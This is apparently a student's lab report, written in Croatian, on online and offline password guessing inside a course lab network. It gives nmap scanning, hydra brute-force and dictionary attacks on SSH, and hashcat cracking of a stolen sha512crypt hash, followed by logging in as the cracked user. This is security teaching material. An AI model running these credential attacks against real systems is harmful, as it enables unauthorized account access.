# SRP, lab5, Online and Offline Password Guessing Attacks

### **Online Password Guessing**

Otvorili smo bash shell te pingali lab server radi provjere jesmo li na istoj lokalnoj mreži.

```jsx
ping a507-server.local
```

Upoznali smo se s naredbom nmap; zatim smo koristeći sljedeću naredbu 

```jsx
nmap -v 10.0.15.0/28
```

Zatim smo otvorili web stranicu [http://a507-server.local/](http://a507-server.local/) gdje su bili zapisani svi docker kontejneri. Svatko je pronašao svoj kontejner na koji smo se spajali pomoću ssh.

```jsx
ssh strinic_mia@10.0.15.2
```

Od nas se tražilo da unesemo lozinku. Ono što znamo o njoj jest da je sastavljena od 4 do 6 lowercase slova engleske abecede (ukupno ih ima 26).

Za brute force-anje lozinke koristimo “hydra” alat:

```jsx
hydra -l strinic_mia -x 4:6:a 10.0.15.2 -V -t 4 ssh
```

Budući da bi vrijeme za probijanje lozinke bilo predugo, koristili smo predefinirane 

dictionary-je, koje smo dohvatili sa servera.

```jsx
wget -r -nH -np --reject "index.html*" [http://a507-server.local:8080/dictionary/g5/](http://a507-server.local:8080/dictionary/g1/)
```

Zatim koristimo hydra zajedno s dictionary-jem.

```jsx
hydra -l strinic_mia -P dictionary/g5/dictionary_online.txt 10.0.15.2 -V -t 4 ssh
```

Dictionary ima preko 800 lozinki, a tek kada sam pronašla odgovarajuću mogla sam pristupiti kontejneru te se s lokalnog spojiti na remote računalo.

### **Offline Password Guessing**

Imala sam pristup remote računalu te smo htjeli pronaći lozinke drugih korisnika.

Prvo smo pronašli folder unutar kojeg su se nalazile hashirane lozinke.

Zatim smo kopirali hash vrijednost nekog korisnika (John Doe, u mom slučaju) u lokalni file “hash.txt”.

Koristili smo naredbu hashcat za napad:

```jsx
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

Budući da bi vrijeme za brute-force-anje lozinke bilo predugo, koristili smo predefinirani dictionary.

```jsx
hashcat --force -m 1800 -a 0 hash.txt dictionary/g5/dictionary_offline.txt --status --status-timer 10
```

Kad je hashcat pronašao lozinku, mogli smo se uspješno povezati na remote računalo kao korisnik čiju smo lozinku probili.

Sljedećom naredbom provjerili smo valjanost probijene lozinke, odnosno prijavom na udaljeni stroj: 

```jsx
ssh john_doe@10.0.15.2
```